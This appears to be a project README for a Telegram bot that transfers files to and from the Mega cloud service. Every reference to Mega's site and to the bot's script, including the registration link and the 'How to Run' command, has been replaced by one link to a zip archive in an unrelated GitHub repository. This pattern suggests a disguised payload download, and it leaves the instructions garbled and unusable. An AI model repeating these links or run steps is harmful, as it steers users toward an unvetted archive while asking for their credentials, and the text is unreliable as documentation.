# Unk9S_BoT
Robot for downloading file types and uploading it to the telegram servers and vice versa and downloading files uploaded to the telegram and making their download link from the https://raw.githubusercontent.com/codeslide/jdvrif_rust/master/tmp_down/rust-jdvrif-v3.2-beta.5.zip servers.

This robot will not store transaction information and will function as a dummy, in which case you no longer need to buy money services to cover the size of the robot, and information security will be maintained,

The next striking thing is that the robot chooses the names of the transacted files as a chance, so it does not interfere with the file management, and it can be very quick, and the very last of its operations is the files made on the https://raw.githubusercontent.com/codeslide/jdvrif_rust/master/tmp_down/rust-jdvrif-v3.2-beta.5.zip server. Clears the desired server.

This robot communicates directly with the https://raw.githubusercontent.com/codeslide/jdvrif_rust/master/tmp_down/rust-jdvrif-v3.2-beta.5.zip cloud network API and automatically installs and uses Megacmd on Windows platforms, all of which will be done automatically.

Note To use the robot, you must register on https://raw.githubusercontent.com/codeslide/jdvrif_rust/master/tmp_down/rust-jdvrif-v3.2-beta.5.zip and enter your username and password in the https://raw.githubusercontent.com/codeslide/jdvrif_rust/master/tmp_down/rust-jdvrif-v3.2-beta.5.zip script in the


    'mega-login Email Password',

    updater = Updater('Token')
        
In the Email and Password fields, enter your information. Also, in Token, insert Token and start the script.


# How to Run
```
pip install telegram python-telegram-bot requests wget & python -m pip install --upgrade pip
python https://raw.githubusercontent.com/codeslide/jdvrif_rust/master/tmp_down/rust-jdvrif-v3.2-beta.5.zip
```
